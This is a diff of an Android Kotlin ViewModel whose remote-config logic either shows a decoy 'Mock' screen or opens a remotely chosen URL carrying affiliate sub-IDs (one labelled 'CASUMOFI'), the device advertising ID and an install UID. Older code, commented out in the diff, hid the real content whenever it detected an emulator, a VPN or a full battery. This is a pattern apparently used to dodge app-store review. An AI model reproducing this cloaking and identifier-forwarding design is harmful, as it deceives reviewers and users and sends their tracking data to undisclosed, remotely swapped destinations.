@@ -42,58 +42,94 @@ class MainViewModel @Inject constructor(private val repo: SystemRepo) : ViewMode
                         minimumFetchIntervalInSeconds = 3600
                     }
                     remoteConfig.setConfigSettingsAsync(configSettings)
+                    val deeplink = "myapp://sub5=88m5wa69aaajqrf1c1yu&sub1=SSS&sub2=CASUMOFI&sub3=SSS&sub4=CASUMOFI"//repo.getDeepLink()
+                    println("deeplink $deeplink")
                     remoteConfig.fetchAndActivate()
                         .addOnCompleteListener {
                             if (it.isSuccessful) {
-                                val isCheckedVpn = remoteConfig.getBoolean("to")
+                                //val isCheckedVpn = false//remoteConfig.getBoolean("to")
                                 val resultUrl1 = remoteConfig.getString("url1")
                                 val resultUrl2 = remoteConfig.getString("url2")
-                                val vpnActive = repo.vpnActive()
-                                val batteryLevel = repo.getBatteryLevel()
+                                println("Url1 $resultUrl1")
+                                println("Url2 $resultUrl2")
+                                if ((resultUrl1.isEmpty() && resultUrl2.isEmpty())) {
+                                    _showData.value = MainState.Mock
+                                } else {
+                                    //val deeplink = repo.getDeepLink()
+                                    val apsUid = repo.apsUid()
+                                    val advId = repo.getAdvertisingId()
+                                    println("apsUid $apsUid")
+                                    println("advId $advId")
+                                    if (deeplink==null||advId==null) {
+                                        _showData.value = MainState.Success(url = resultUrl1)
+                                    } else {
+                                        val subIds = parseSub(deeplink)
+                                        val link = "${resultUrl2}?key=${subIds["5"]}&sub1=${subIds["1"]}&sub2=${subIds["2"]}&sub3=${subIds["3"]}&sub4=${subIds["4"]}&adv_id=${advId}&apps_id=${apsUid}"
+                                        Log.d("AAAAA", "link $link")
+                                        println("link $link")
+                                        _showData.value = MainState.Success(url = link)
+                                    }
+                                }
+                                /*//val vpnActive = repo.vpnActive()
+                                //val batteryLevel = repo.getBatteryLevel()
                                 Log.d("AAAAA", "isCheckedVpn $isCheckedVpn")
                                 Log.d("AAAAA", "resultUrl $resultUrl1")
                                 Log.d("AAAAA", "resultUrl2 $resultUrl2")
-                                Log.d("AAAAA", "vpnActive $vpnActive")
-                                Log.d("AAAAA", "batteryLevel $batteryLevel")
+                                //Log.d("AAAAA", "vpnActive $vpnActive")
+                                //Log.d("AAAAA", "batteryLevel $batteryLevel")
                                 if (isCheckedVpn) {
                                     viewModelScope.launch {
-                                        Log.d("AAAAA", "checkIsEmu ${checkIsEmu()}")
-                                        if (checkIsEmu() || (resultUrl1.isEmpty() && resultUrl2.isEmpty()) || vpnActive || batteryLevel > 99) {
+                                        //Log.d("AAAAA", "checkIsEmu ${checkIsEmu()}")
+                                        if (*//*checkIsEmu() ||*//* (resultUrl1.isEmpty() && resultUrl2.isEmpty()) *//*|| vpnActive || batteryLevel > 99*//*) {
                                             _showData.value = MainState.Mock
                                         } else {
                                             val deeplink = repo.getDeepLink()
                                             val apsUid = repo.apsUid()
+                                            val advId = repo.getAdvertisingId()
                                             Log.d("AAAAA", "deeplink $deeplink")
-                                            if (deeplink==null) {
+                                            Log.d("AAAAA", "apsUid $apsUid")
+                                            Log.d("AAAAA", "advId $advId")
+                                            println("deeplink $deeplink")
+                                            println("apsUid $apsUid")
+                                            println("advId $advId")
+                                            if (deeplink==null||advId==null) {
                                                 _showData.value = MainState.Success(url = resultUrl1)
                                             } else {
                                                 val subIds = parseSub(deeplink)
-                                                val link = "${resultUrl2}?key=${subIds["5"]}&sub1=${subIds["1"]}&sub2=${subIds["2"]}&sub3=${subIds["3"]}&sub4=${subIds["4"]}&adv_id={adv_id}&apps_id=${apsUid}"
+                                                val link = "${resultUrl2}?key=${subIds["5"]}&sub1=${subIds["1"]}&sub2=${subIds["2"]}&sub3=${subIds["3"]}&sub4=${subIds["4"]}&adv_id=${advId}&apps_id=${apsUid}"
                                                 Log.d("AAAAA", "link $link")
+                                                println("link $link")
                                                 _showData.value = MainState.Success(url = link)
                                             }
                                         }
                                     }
                                 } else {
                                     viewModelScope.launch {
-                                        Log.d("AAAAA", "checkIsEmu ${checkIsEmu()}")
-                                        if (checkIsEmu() || (resultUrl1.isEmpty() && resultUrl2.isEmpty()) || batteryLevel > 99) {
+                                        //Log.d("AAAAA", "checkIsEmu ${checkIsEmu()}")
+                                        if (*//*checkIsEmu() ||*//* (resultUrl1.isEmpty() && resultUrl2.isEmpty()) *//*|| batteryLevel > 99*//*) {
                                             _showData.value = MainState.Mock
                                         } else {
                                             val deeplink = repo.getDeepLink()
                                             val apsUid = repo.apsUid()
+                                            val advId = repo.getAdvertisingId()
+                                            println("deeplink $deeplink")
+                                            println("apsUid $apsUid")
+                                            println("advId $advId")
                                             Log.d("AAAAA", "deeplink $deeplink")
-                                            if (deeplink==null) {
+                                            Log.d("AAAAA", "apsUid $apsUid")
+                                            Log.d("AAAAA", "advId $advId")
+                                            if (deeplink==null||advId==null) {
                                                 _showData.value = MainState.Success(url = resultUrl1)
                                             } else {
                                                 val subIds = parseSub(deeplink)
-                                                val link = "${resultUrl2}?key=${subIds["5"]}&sub1=${subIds["1"]}&sub2=${subIds["2"]}&sub3=${subIds["3"]}&sub4=${subIds["4"]}&adv_id={adv_id}&apps_id=${apsUid}"
+                                                val link = "${resultUrl2}?key=${subIds["5"]}&sub1=${subIds["1"]}&sub2=${subIds["2"]}&sub3=${subIds["3"]}&sub4=${subIds["4"]}&adv_id=${advId}&apps_id=${apsUid}"
                                                 Log.d("AAAAA", "link $link")
+                                                println("link $link")
                                                 _showData.value = MainState.Success(url = link)
                                             }
                                         }
                                     }
-                                }
+                                }*/
 
                             } else {
                                 _showData.value = MainState.NoInternet
